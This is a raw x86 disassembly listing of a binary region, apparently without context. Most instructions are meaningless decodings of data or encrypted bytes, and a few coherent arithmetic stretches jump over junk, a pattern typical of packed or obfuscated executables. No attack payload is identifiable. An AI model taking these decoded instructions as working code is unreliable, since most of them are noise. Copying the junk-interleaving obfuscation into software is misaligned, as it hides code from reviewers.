  406cb8:	jmp    0xa9d6:0xd8db4681
  406cbf:	clc    
  406cc0:	jae    0x406cf8
  406cc2:	imul   edx,DWORD PTR [eax+ebp*2],0xd347aa63
  406cc9:	mov    ds:0xb8c49534,eax
  406cce:	add    DWORD PTR [edi],edi
  406cd0:	push   ebp
  406cd1:	outs   dx,DWORD PTR ds:[esi]
  406cd2:	jle    0x406c68
  406cd4:	or     BYTE PTR [esi-0x3a167b0],ch
  406cda:	sti    
  406cdb:	fst    st(1)
  406cdd:	jl     0x406cba
  406cdf:	pop    edi
  406ce0:	lock out 0xf5,al
  406ce3:	push   eax
  406ce4:	xchg   edx,eax
  406ce5:	mov    ecx,0xf8f59bbe
  406cea:	cs xchg edi,eax
  406cec:	sub    eax,0x38b1847d
  406cf1:	cld    
  406cf2:	push   es
  406cf3:	jne    0x406c80
  406cf5:	jle    0x406cbd
  406cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf8:	call   0xf33c843c
  406cfd:	xchg   edx,eax
  406cfe:	sub    DWORD PTR [edx],esi
  406d00:	(bad)  
  406d01:	dec    esi
  406d02:	js     0x406cb9
  406d04:	bnd ja 0x406ce6
  406d07:	jbe    0x406d14
  406d09:	mov    al,0xf9
  406d0b:	icebp  
  406d0c:	cli    
  406d0d:	(bad)  
  406d0e:	push   cs
  406d0f:	add    ebp,ebp
  406d11:	jl     0x406d20
  406d13:	mov    dl,0x7e
  406d15:	test   al,0x41
  406d17:	cwde   
  406d18:	sub    al,0xfd
  406d1a:	daa    
  406d1b:	int3   
  406d1c:	scas   al,BYTE PTR es:[edi]
  406d1d:	jl     0x406ccf
  406d1f:	pop    ds
  406d20:	ins    DWORD PTR es:[edi],dx
  406d21:	mov    eax,ds:0xe74afa88
  406d26:	xchg   BYTE PTR [edx],bh
  406d28:	test   DWORD PTR [edx],ebp
  406d2a:	ss int3 
  406d2c:	mov    bl,0xab
  406d2e:	test   BYTE PTR [edi-0x30a6e15f],0xf6
  406d35:	popa   
  406d36:	or     eax,0x2ac4539c
  406d3b:	dec    ecx
  406d3c:	pop    ss
  406d3d:	jecxz  0x406d90
  406d3f:	jne    0x406d1e
  406d41:	shl    ecx,0x1e
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x66a0603]
  406db5:	cmp    BYTE PTR [edi+0x188b0ab0],0x18
  406dbc:	sahf   
  406dbd:	adc    bl,BYTE PTR [eax]
  406dbf:	sbb    BYTE PTR [ecx],cl
  406dc1:	mov    ah,0xb6
  406dc3:	xor    DWORD PTR [ebp+0x6d],ebx
  406dc6:	rol    DWORD PTR [ebx-0x38c57831],cl
  406dcc:	aad    0x1f
  406dce:	je     0x406dec
  406dd0:	repz or eax,0x511a43cf
  406dd6:	and    eax,0xffffffca
  406dd9:	enter  0x3634,0xb6
  406ddd:	addr16 inc esi
  406ddf:	xlat   BYTE PTR ds:[ebx]
  406de0:	jecxz  0x406e29
  406de2:	je     0x406e0e
  406de4:	xor    DWORD PTR [edi+0x10],esi
  406de7:	mov    eax,ds:0xd332b55e
  406dec:	outs   dx,BYTE PTR ss:[esi]
  406dee:	mov    al,ds:0xf30c995c
  406df3:	or     al,0x32
  406df5:	and    ah,dh
  406df7:	hlt    
  406df8:	rcl    DWORD PTR [ecx+0x13],0x7f
  406dfc:	xchg   esp,eax
  406dfd:	dec    edx
  406dfe:	pop    edi
  406dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e00:	dec    edi
  406e01:	push   eax
  406e02:	jo     0x406e3e
  406e04:	xor    eax,0x75da3896
  406e09:	xchg   ecx,eax
  406e0a:	bound  edx,QWORD PTR ds:0xb64da687
  406e10:	pop    ecx
  406e11:	rol    BYTE PTR [edx],0x45
  406e14:	and    BYTE PTR [edi-0x51],dh
  406e17:	jnp    0x406e50
  406e19:	sub    DWORD PTR [esi+0x7c],edx
  406e1c:	in     eax,0x7e
  406e1e:	pusha  
  406e1f:	or     cl,BYTE PTR [esi]
  406e21:	xchg   ebx,eax
  406e22:	mov    DWORD PTR [ebp-0x3eba09b3],eax
  406e28:	(bad)  
  406e29:	loope  0x406e50
  406e2b:	ss (bad) 
  406e2d:	mov    esi,0x1d2f0c81
  406e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e33:	dec    edi
  406e34:	pop    esi
  406e35:	adc    ebp,DWORD PTR [eax]
  406e37:	ja     0x406e21
  406e39:	scas   eax,DWORD PTR es:[edi]
  406e3a:	scas   eax,DWORD PTR es:[edi]
  406e3b:	inc    edx
  406e3c:	inc    ecx
  406e3d:	jecxz  0x406e7b
  406e3f:	fwait
  406e40:	dec    ecx
  406e41:	rol    BYTE PTR ds:0xb445df50,0x82
  406e48:	ins    WORD PTR es:[edi],dx
  406e4a:	xchg   ebx,eax
  406e4b:	push   cs
  406e4c:	dec    esp
  406e4d:	int3   
  406e4e:	daa    
  406e4f:	push   edx
  406e50:	pop    ds
  406e51:	jl     0x406e75
  406e53:	sbb    eax,0x1ff0259d
  406e58:	das    
  406e59:	dec    eax
  406e5a:	mov    bh,0x5e
  406e5c:	mov    al,ds:0x3c62b654
  406e61:	mov    edx,DWORD PTR [edi]
  406e63:	add    DWORD PTR [esi],edx
  406e65:	xor    al,0x48
  406e67:	push   ds
  406e68:	add    ecx,DWORD PTR [edi-0x17b78edc]
  406e6e:	mov    esi,0xa8dc8792
  406e73:	sbb    eax,0x185b0d11
  406e78:	mov    ah,0xde
  406e7a:	out    0x76,eax
  406e7c:	push   ss
  406e7d:	mov    esp,esp
  406e7f:	inc    esp
  406e80:	pop    ebp
  406e81:	cld    
  406e82:	inc    esp
  406e83:	mov    ecx,0xcd1d62e0
  406e88:	jge    0x406e91
  406e8a:	jb     0x406e32
  406e8c:	xchg   ebx,eax
  406e8d:	xor    al,0x20
  406e8f:	push   0x4b
  406e91:	js     0x406e5b
  406e93:	xchg   edx,eax
  406e94:	jp     0x406ee9
  406e96:	jecxz  0x406ef1
  406e98:	dec    edi
  406e99:	pop    esi
  406e9a:	fnstcw WORD PTR [ebx+0x35]
  406e9d:	pushf  
  406e9e:	jle    0x406f13
  406ea0:	retf   
  406ea1:	push   ebx
  406ea2:	dec    eax
  406ea3:	lahf   
  406ea4:	push   esi
  406ea5:	repnz mov eax,ds:0x9874141b
  406eab:	nop
  406eac:	popa   
  406ead:	ds cmc 
  406eaf:	push   edi
  406eb0:	les    esp,FWORD PTR [edi-0x23]
  406eb3:	mov    ch,0x17
  406eb5:	push   ds
  406eb6:	ja     0x406e59
  406eb8:	sbb    DWORD PTR [edi+0x1795ab0b],esi
  406ebe:	repnz pop edi
  406ec0:	cwde   
  406ec1:	pusha  
  406ec2:	sub    eax,DWORD PTR [eax-0x3a]
  406ec5:	(bad)  
  406ec6:	adc    al,bl
  406ec8:	inc    ecx
  406ec9:	leave  
  406eca:	mov    al,ds:0xa8790efc
  406ecf:	push   edi
  406ed0:	sub    esi,edx
  406ed2:	ins    BYTE PTR es:[edi],dx
  406ed3:	dec    edi
  406ed4:	adc    al,0xaa
  406ed6:	dec    esi
  406ed7:	add    DWORD PTR [ebp-0x3],ebp
  406eda:	popf   
  406edb:	mov    edi,0x7e973e72
  406ee0:	(bad)  
  406ee1:	xlat   BYTE PTR ds:[ebx]
  406ee2:	data16 sti 
  406ee4:	int3   
  406ee5:	popf   
  406ee6:	mov    bl,0x9e
  406ee8:	nop
  406ee9:	jge    0x406ec5
  406eeb:	cmp    eax,0xccf14b48
  406ef0:	mov    al,ds:0x6dc9c48e
  406ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ef6:	jle    0x406f20
  406ef8:	adc    ch,cl
  406efa:	jns    0x406f39
  406efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406efd:	inc    ecx
  406efe:	retf   
  406eff:	sub    DWORD PTR [ecx+0x2a],ebp
  406f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f03:	mov    ch,0xeb
  406f05:	push   ebx
  406f06:	or     DWORD PTR ds:0xe8fa5ed0,esp
  406f0c:	pop    ebx
  406f0d:	inc    esi
  406f0e:	xchg   edi,eax
  406f0f:	add    esi,DWORD PTR [ebx+0x2a]
  406f12:	lods   eax,DWORD PTR ds:[esi]
  406f13:	fdivr  QWORD PTR [esi+0x28]
  406f16:	test   eax,0x97ab44c
  406f1b:	sub    al,0x0
  406f1d:	aaa    
  406f1e:	ds push ds
  406f20:	fcomip st,st(7)
  406f22:	scas   eax,DWORD PTR es:[edi]
  406f23:	push   0x92613179
  406f28:	inc    eax
  406f29:	jne    0x406f7b
  406f2b:	out    dx,al
  406f2c:	idiv   BYTE PTR [eax]
  406f2e:	daa    
  406f2f:	(bad)  
  406f30:	ja     0x406f90
  406f32:	cmp    eax,0xdcf1642b
  406f37:	pop    DWORD PTR [esi+eax*2-0x15e4ea38]
  406f3e:	jb     0x406fa6
  406f40:	adc    eax,0x26018145
  406f45:	xor    eax,0x917b4afd
  406f4a:	iret   
  406f4b:	and    al,0x98
  406f4d:	pop    ebp
  406f4e:	sbb    bl,BYTE PTR [ebp-0x7a]
  406f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f52:	inc    ecx
  406f53:	mov    esp,0xfd5e25c1
  406f58:	adc    ch,BYTE PTR [ebx]
  406f5a:	mov    WORD PTR [bx],gs
  406f5d:	stos   DWORD PTR es:[edi],eax
  406f5e:	jge    0x406f45
  406f60:	jne    0x406f2c
  406f62:	hlt    
  406f63:	or     al,0x9b
  406f65:	pop    edi
  406f66:	int    0x9f
  406f68:	test   eax,0x6af2cfe2
  406f6d:	out    0x4b,al
  406f6f:	ror    BYTE PTR [esp+ecx*2-0x65],1
  406f73:	push   es
  406f74:	out    0x92,al
  406f76:	mov    edi,0xabec6497
  406f7b:	icebp  
  406f7c:	je     0x406fb4
  406f7e:	or     eax,0x10bbd3f2
  406f83:	push   cs
  406f84:	iret   
  406f85:	mov    cl,0x72
  406f87:	jnp    0x407008
  406f89:	cmc    
  406f8a:	in     al,0xee
  406f8c:	call   0x682e:0x5b360580
  406f93:	jnp    0x406fc5
  406f95:	push   ss
  406f96:	iret   
  406f97:	sar    BYTE PTR [ebp+0x42f645ce],cl
  406f9d:	outs   dx,DWORD PTR ds:[esi]
  406f9e:	jne    0x407007
  406fa0:	xor    DWORD PTR [ecx],esp
  406fa2:	xor    bh,0x6e
  406fa5:	push   ecx
  406fa6:	test   eax,0x886886bf
  406fab:	adc    ch,dl
  406fad:	cld    
  406fae:	cld    
  406faf:	jo     0x406f97
  406fb1:	dec    esi
  406fb2:	sub    al,0x81
  406fb4:	(bad)  
  406fb5:	nop
  406fb6:	xor    al,0x98
  406fb8:	mov    eax,0xf3e86794
  406fbd:	sub    DWORD PTR [edx+0x4090efc4],ebp
  406fc3:	sub    ebp,eax
  406fc5:	(bad)
  406fc8:	out    dx,eax
  406fc9:	inc    edi
  406fca:	push   ds
  406fcb:	or     ch,BYTE PTR [edi-0x53]
  406fce:	or     BYTE PTR [edx-0x42],bl
  406fd1:	aam    0x2d
  406fd3:	inc    ebx
  406fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fd5:	or     al,0x83
  406fd7:	push   edi
  406fd8:	pop    ds
  406fd9:	push   cs
  406fda:	jb     0x407003
  406fdc:	sahf   
  406fdd:	loopne 0x406fa6
  406fdf:	jecxz  0x406ffd
  406fe1:	xchg   esp,eax
  406fe2:	and    bl,BYTE PTR [eax+0x53ac4b6d]
  406fe8:	inc    edi
  406fe9:	adc    al,0x45
  406feb:	popf   
  406fec:	xchg   edi,eax
  406fed:	cld    
  406fee:	stc    
  406fef:	stc    
  406ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ff1:	lea    esp,[eax+eax*2-0x14b78980]
  406ff8:	shl    BYTE PTR [ebx],cl
  406ffa:	push   eax
  406ffb:	inc    esp
  406ffc:	push   edx
  406ffd:	mul    BYTE PTR [edx-0x1b]
  407000:	push   ds
  407001:	xor    al,0x27
  407003:	std    
  407004:	scas   eax,DWORD PTR es:[edi]
  407005:	imul   edx,DWORD PTR ds:0xdfaad8c0,0xffffffc6
  40700c:	das    
  40700d:	fidivr DWORD PTR [edx+eax*4-0x1a2bf98a]
  407014:	push   edx
  407015:	push   edx
  407016:	push   0xd7d4a420
  40701b:	sub    BYTE PTR [ebx+ebp*4-0x51acd2cc],cl
  407022:	gs enter 0x9c29,0x2b
  407027:	sbb    BYTE PTR [esi-0x2],dh
  40702a:	jbe    0x407007
  40702c:	jb     0x4070a7
  40702e:	ret    0xbcb7
  407031:	std    
  407032:	mov    edi,0x5fdf846d
  407037:	lock jne 0x40705d
  40703a:	hlt    
  40703b:	inc    ebx
  40703c:	into   
  40703d:	lds    ebp,FWORD PTR [eax+edi*8-0x38dc2dd5]
  407044:	inc    DWORD PTR [esi]
  407046:	enter  0xf9ca,0x83
  40704a:	cmp    dh,BYTE PTR [esi+0x25]
  40704d:	addr16 mov bl,0x5f
  407050:	add    dh,BYTE PTR [ebp-0x75f0b37e]
  407056:	mov    ebp,0x7c10cecc
  40705b:	popa   
  40705c:	stos   DWORD PTR es:[edi],eax
  40705d:	xor    BYTE PTR [eax],bl
  40705f:	into   
  407060:	fnstsw ax
  407062:	cvtps2pi mm5,QWORD PTR [eax]
  407065:	fwait
  407066:	and    BYTE PTR [esi],dl
  407068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407069:	retf   
  40706a:	jle    0x40704f
  40706c:	repnz add BYTE PTR [esi],bh
  40706f:	ja     0x4070d8
  407071:	int3   
  407072:	jns    0x4070a6
  407074:	mov    cl,0xee
  407076:	push   eax
  407077:	xchg   BYTE PTR [esi],bl
  407079:	bound  edi,QWORD PTR [ecx+0x69]
  40707c:	lahf   
  40707d:	mov    ecx,0x8edf830
  407082:	xchg   edi,eax
  407083:	ins    DWORD PTR es:[edi],dx
  407084:	mov    eax,0x77d92bc9
  407089:	pusha  
  40708a:	or     BYTE PTR [ebx-0x1a],bl
  40708d:	mov    ?,WORD PTR [esi]
  40708f:	out    dx,eax
  407090:	adc    DWORD PTR ds:0x9bec6f14,esi
  407096:	stos   BYTE PTR es:[edi],al
  407097:	out    0xaf,eax
  407099:	mov    ds:0x638ef713,eax
  40709e:	add    dh,BYTE PTR [ebp-0x2d]
  4070a1:	ret    0x2da
  4070a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070a5:	div    DWORD PTR [ecx+0x33]
  4070a8:	mov    bh,0x1b
  4070aa:	add    DWORD PTR [esi-0x5c],edx
  4070ad:	or     ah,BYTE PTR [ebx+0x35eb1f8d]
  4070b3:	jge    0x407068
  4070b5:	and    DWORD PTR [eax+eiz*2+0x40],esi
  4070b9:	std    
  4070ba:	aam    0x2f
  4070bc:	outs   dx,DWORD PTR ds:[esi]
  4070bd:	xor    edx,DWORD PTR [ecx+0x5f]
  4070c0:	(bad)  
  4070c1:	pop    edi
  4070c2:	push   ecx
  4070c4:	add    BYTE PTR [ebx-0x16],bl
  4070c7:	xor    BYTE PTR [edi-0x7d0dc1bc],cl
  4070cd:	scas   al,BYTE PTR es:[edi]
  4070ce:	or     DWORD PTR [eax+0xc0df991],eax
  4070d4:	icebp  
  4070d5:	loop   0x40709f
  4070d7:	pop    eax
  4070d8:	loope  0x407073
  4070da:	dec    edx
  4070db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070dc:	shl    dl,0xcf
  4070df:	fbstp  TBYTE PTR [esi]
  4070e1:	sub    dl,0xf4
  4070e4:	sahf   
  4070e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e6:	es repz push esi
  4070e9:	adc    BYTE PTR [edi+0x1cc795cc],bh
  4070ef:	arpl   WORD PTR [edx-0x110759e1],cx
  4070f5:	sub    al,0xec
  4070f7:	(bad)  
  4070f8:	sqrtps xmm1,XMMWORD PTR ds:0x2eaf4e44
  4070ff:	and    al,0xdd
  407101:	mov    eax,ds:0xd94ab73f
  407106:	inc    edi
  407107:	(bad)  
  407108:	mov    ch,0xde
  40710a:	add    DWORD PTR [esi],ebx
  40710c:	stc    
  40710d:	inc    esi
  40710e:	and    eax,0x31017630
  407113:	and    eax,edx
  407115:	jbe    0x4070c5
  407117:	inc    esi
  407118:	je     0x4070c4
  40711a:	jns    0x4070c0
  40711c:	mov    esp,0xf7c4511c
  407121:	sahf   
  407122:	push   esi
  407123:	cs mov eax,0x611b82d4
  407129:	out    dx,al
  40712a:	out    dx,al
  40712b:	gs jl  0x407167
  40712e:	xchg   edi,eax
  40712f:	ins    DWORD PTR es:[edi],dx
  407130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407132:	dec    edx
  407133:	repnz daa 
  407135:	lds    ebp,FWORD PTR [ebx]
  407137:	push   esi
  407138:	push   eax
  407139:	push   ebx
  40713a:	and    edx,DWORD PTR [edx+ecx*8-0x13]
  40713e:	inc    eax
  40713f:	(bad)  
  407140:	add    DWORD PTR [edi],eax
  407142:	cmc    
  407143:	popa   
  407144:	sbb    BYTE PTR [ebp-0x65],cl
  407147:	shr    BYTE PTR [esi+0x1f],cl
  40714a:	stc    
  40714b:	mov    esi,0xda70fa3
  407150:	mov    ds:0x8283b710,al
  407155:	sub    al,BYTE PTR [edi+0x14]
  407158:	mov    ebp,0x18e3833
  40715d:	pop    es
  40715e:	stc    
  40715f:	mov    bh,0xca
  407161:	mov    ds:0x95c3bb80,al
  407166:	mov    esi,0x1f417b25
  40716b:	jp     0x4071e6
  40716d:	xlat   BYTE PTR ds:[ebx]
  40716e:	and    BYTE PTR [ebx],0xd8
  407171:	xchg   esp,eax
  407172:	jmp    0xfad2:0xfdc3825f
  407179:	ins    BYTE PTR es:[edi],dx
  40717a:	or     cl,BYTE PTR [edx+0x63af5075]
  407180:	push   cs
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	mov    al,0x3e
  4071c6:	ret    
  4071c7:	jl     0x407159
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi+0x1f181812],bl
  4071d1:	leave  
  4071d2:	(bad)  
  4071d3:	loopne 0x407239
  4071d5:	mov    ch,0x4a
  4071d7:	inc    edi
  4071d8:	inc    esp
  4071d9:	xchg   ebx,eax
  4071da:	outs   dx,DWORD PTR ds:[esi]
  4071db:	mov    eax,0x9b1cbfc9
  4071e0:	outs   dx,BYTE PTR ds:[esi]
  4071e1:	mov    BYTE PTR ds:0x71b6ef98,ch
  4071e7:	push   ds
  4071e8:	push   esi
  4071e9:	out    dx,al
  4071ea:	adc    bh,BYTE PTR [ebp+0x41c12160]
  4071f0:	sub    edx,DWORD PTR [ecx+0x70]
  4071f3:	xchg   edi,eax
  4071f4:	xchg   esp,eax
  4071f5:	push   0xc2697b76
  4071fa:	fiadd  DWORD PTR [edx-0x34]
  4071fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071fe:	push   ss
  4071ff:	mov    ch,0x96
  407201:	jmp    0xdb0e:0x1b033d1f
  407208:	adc    al,dl
  40720a:	sub    eax,0x92351683
  40720f:	mov    DWORD PTR [ebp+0x2b],eax
  407212:	push   esi
  407213:	sub    al,BYTE PTR [edi+0x1f]
  407216:	lock xchg BYTE PTR [ecx],dh
  407219:	out    0x4d,eax
  40721b:	jmp    0x9d54:0x92ef9f40
  407222:	adc    DWORD PTR [ecx+ebx*1-0x707025a0],0x84b136fa
  40722d:	imul   edi,DWORD PTR [esi],0xffffffc9
  407230:	push   ebx
  407231:	pop    ss
  407232:	push   esi
  407233:	call   0x6ccb:0x2cd015
  40723a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40723b:	sar    BYTE PTR ds:0xd023b710,cl
  407241:	inc    ebp
  407242:	test   al,0x75
  407244:	loope  0x40722e
  407246:	scas   al,BYTE PTR es:[edi]
  407247:	mov    ds:0x1d6490bc,eax
  40724c:	mov    dl,0x94
  40724e:	add    al,0x9
  407250:	mov    WORD PTR ds:0xf825ff03,cs
  407256:	imul   edi,DWORD PTR [ecx+0x7b],0x2b9e3378
  40725d:	test   al,0x84
  40725f:	xlat   BYTE PTR ds:[ebx]
  407260:	xchg   edi,eax
  407261:	data16 out dx,al
  407263:	inc    eax
  407264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407265:	dec    esp
  407266:	adc    DWORD PTR [edi+0x23],edi
  407269:	ror    DWORD PTR [eax],1
  40726b:	jo     0x4072a6
  40726d:	lods   al,BYTE PTR ds:[esi]
  40726e:	dec    ebx
  40726f:	fadd   QWORD PTR [esi]
  407271:	and    al,0xfd
  407273:	or     DWORD PTR [esi],esi
  407275:	in     eax,dx
  407276:	xchg   ebp,eax
  407277:	scas   al,BYTE PTR es:[edi]
  407278:	in     eax,dx
  407279:	lea    ebx,ds:0xeccdef22
  40727f:	jp     0x40726b
  407281:	mov    dl,0xdc
  407283:	jecxz  0x40721f
  407285:	cdq    
  407286:	mov    edx,0xb55e0c7a
  40728b:	jp     0x4072a2
  40728d:	out    0xf5,eax
  40728f:	aas    
  407290:	cmp    eax,0x9555a9bd
  407295:	pop    ss
  407296:	push   ss
  407297:	mov    DWORD PTR [ebx+0x50c48b0],esp
  40729d:	pusha  
  40729e:	pop    eax
  40729f:	jne    0x4072ad
  4072a1:	cmp    al,BYTE PTR [ebx+0x4f]
  4072a4:	mov    esi,0xc31c677c
  4072a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072aa:	sub    al,0x3b
  4072ac:	rcr    BYTE PTR [edi-0x570545aa],0x73
  4072b3:	repnz inc eax
  4072b5:	fwait
  4072b6:	out    0x8f,al
  4072b8:	outs   dx,BYTE PTR ds:[esi]
  4072b9:	adc    eax,0x409a8ad3
  4072be:	push   0x88e18be4
  4072c3:	clc    
  4072c4:	jnp    0x407333
  4072c6:	sar    BYTE PTR [edi+0x6a],0x4f
  4072ca:	jne    0x407301
  4072cc:	mov    ebx,0xcdececc8
  4072d1:	das    
  4072d2:	push   eax
  4072d3:	(bad)  
  4072d4:	std    
  4072d5:	mov    ebp,DWORD PTR [edi]
  4072d7:	stos   BYTE PTR es:[edi],al
  4072d8:	inc    ebp
  4072d9:	xor    BYTE PTR [ebx+ecx*4],cl
  4072dc:	nop
  4072dd:	jg     0x4072c5
  4072df:	shr    DWORD PTR [esi-0x32fb502e],cl
  4072e5:	lahf   
  4072e6:	pushf  
  4072e7:	call   0xd13e1fb2
  4072ec:	mov    eax,ds:0x8b4f3e45
  4072f1:	stos   BYTE PTR es:[edi],al
  4072f2:	mov    edx,0x4b17e639
  4072f7:	popf   
  4072f8:	pop    es
  4072f9:	mov    ecx,DWORD PTR [esi]
  4072fb:	fild   DWORD PTR [ebx]
  4072fd:	xlat   BYTE PTR ds:[ebx]
  4072fe:	fisttp QWORD PTR [ebx]
  407300:	or     DWORD PTR [eax+ebp*2-0x6b],edi
  407304:	or     al,0x54
  407306:	es pop ds
  407308:	bound  ecx,QWORD PTR [eax]
  40730a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40730b:	push   ds
  40730c:	adc    bl,dh
  40730e:	xor    al,0xfd
  407310:	add    eax,0xb098d1bb
  407315:	mov    eax,DWORD PTR [esi+0x7d]
  407318:	inc    ecx
  407319:	(bad)  
  40731a:	xor    BYTE PTR [ebx-0x43],cl
  40731d:	or     bh,ch
  40731f:	fsub   st,st(0)
  407321:	add    eax,DWORD PTR [esp+edx*8]
  407324:	xchg   esp,eax
  407326:	pop    edi
  407327:	bound  ebx,QWORD PTR [ebx]
  407329:	cwde   
  40732a:	imul   BYTE PTR [ebx+0x4abdd2dc]
  407330:	inc    ebp
  407331:	fcmovne st,st(5)
  407333:	cmp    bl,al
  407335:	or     eax,0xd9b97466
  40733a:	mov    edi,0x732a09a5
  40733f:	out    0x35,al
  407341:	out    0xfb,eax
  407343:	js     0x407347
  407345:	xor    DWORD PTR [eax-0x52],eax
  407348:	jne    0x407334
  40734a:	jnp    0x407322
  40734c:	cmp    al,0x16
  40734e:	(bad)  
  40734f:	hlt    
  407350:	ret    0x203b
  407353:	jbe    0x4073c0
  407355:	pop    ss
  407356:	cmp    bh,dh
  407358:	cli    
  407359:	es lahf 
  40735b:	test   BYTE PTR [ecx],dh
  40735d:	fcmovnu st,st(6)
  40735f:	mov    bh,0xa3
  407361:	cli    
  407362:	shl    BYTE PTR [edx+0x6e5152d8],0xc7
  407369:	xchg   esi,ebp
  40736b:	retf   
  40736c:	cwde   
  40736d:	repz jb 0x40731c
  407370:	push   esp
  407371:	xor    BYTE PTR [ecx],dl
  407373:	pop    ss
  407374:	aas    
  407375:	sub    dh,al
  407377:	imul   eax,DWORD PTR [eax+0x688e6bb8],0xffffffba
  40737e:	into   
  40737f:	gs sar BYTE PTR ds:[eax-0x1b],cl
  407384:	xchg   esi,eax
  407385:	cmp    al,0x1
  407387:	je     0x407319
  407389:	loope  0x407388
  40738b:	repnz rcl BYTE PTR [eax-0xe],cl
  40738f:	xchg   esp,eax
  407390:	test   DWORD PTR [ecx],edx
  407392:	mov    ch,0x4b
  407394:	mov    DWORD PTR [ebx+0x514250ac],edi
  40739a:	mov    al,0xe8
  40739c:	(bad)  
  40739d:	into   
  40739e:	ins    DWORD PTR es:[edi],dx
  40739f:	outs   dx,BYTE PTR ds:[esi]
  4073a0:	out    dx,al
  4073a1:	jno    0x4073ef
  4073a3:	add    al,0xba
  4073a5:	cld    
  4073a6:	ret    
  4073a7:	popf   
  4073a8:	pop    ss
  4073a9:	rcr    DWORD PTR [ebp-0x9],cl
  4073ac:	arpl   WORD PTR [eax+0x54],bp
  4073af:	pop    esp
  4073b0:	and    ecx,0x74
  4073b3:	jo     0x407376
  4073b5:	and    al,0xde
  4073b7:	out    0x8c,al
  4073b9:	(bad)  
  4073ba:	iret   
  4073bb:	mov    al,ds:0xda22e9d9
  4073c0:	push   ds
  4073c1:	addr16 out 0xbb,al
  4073c4:	mov    dh,0xdc
  4073c6:	(bad)  
  4073c7:	xchg   edi,eax
  4073c8:	pop    edx
  4073c9:	jns    0x407414
  4073cb:	jmp    0x3675:0x3f548e0a
  4073d2:	sub    BYTE PTR [ebp-0x78b7be0b],cl
  4073d8:	test   DWORD PTR [ecx+ebx*2],edi
  4073db:	xor    BYTE PTR [ebp+0x23],0x81
  4073df:	pop    ss
  4073e0:	push   eax
  4073e1:	icebp  
  4073e2:	enter  0xf7bc,0x8
  4073e6:	inc    esi
  4073e7:	js     0x4073cb
  4073e9:	(bad)  
  4073ea:	lahf   
  4073eb:	hlt    
  4073ec:	not    DWORD PTR [ecx-0x36]
  4073ef:	pop    eax
  4073f0:	xchg   edx,eax
  4073f1:	fsubrp st(6),st
  4073f3:	fwait
  4073f4:	jecxz  0x4073d8
  4073f6:	xor    DWORD PTR [edx+edx*8-0x7c],edi
